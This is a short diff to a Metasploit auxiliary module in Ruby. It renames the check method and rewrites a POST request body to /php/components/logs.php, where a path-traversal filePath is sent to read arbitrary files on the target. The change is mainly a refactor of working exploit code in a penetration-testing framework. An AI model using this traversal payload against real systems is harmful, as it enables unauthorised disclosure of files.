@@ -40,7 +40,7 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  def check
+  def check_host(_ip)
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'maintenance.php')
@@ -69,8 +69,17 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => normalize_uri('/php/components/logs.php'),
       'vars_post' =>
       {
-        'items' => %([{"buttons":[{"labelStringCode":"Maint_PurgeLog","event":"logManage(app.log, cleanLog)"},{"labelStringCode":"Maint_RestartServer","event":"askRestartBackend()"}],"fileName":"#{dummyfilename}","filePath":"#{traversal}#{filepath}","textAreaCssClass":"logs"}])
-
+        'items' => [
+          {
+            'buttons' => [
+              { 'labelStringCode' => 'Maint_PurgeLog', 'event' => 'logManage(app.log, cleanLog)' },
+              { 'labelStringCode' => 'Maint_RestartServer', 'event' => 'askRestartBackend()' }
+            ],
+            'fileName' => dummyfilename,
+            'filePath' => "#{traversal}#{filepath}",
+            'textAreaCssClass' => 'logs'
+          }
+        ].to_json
       }
     })
 
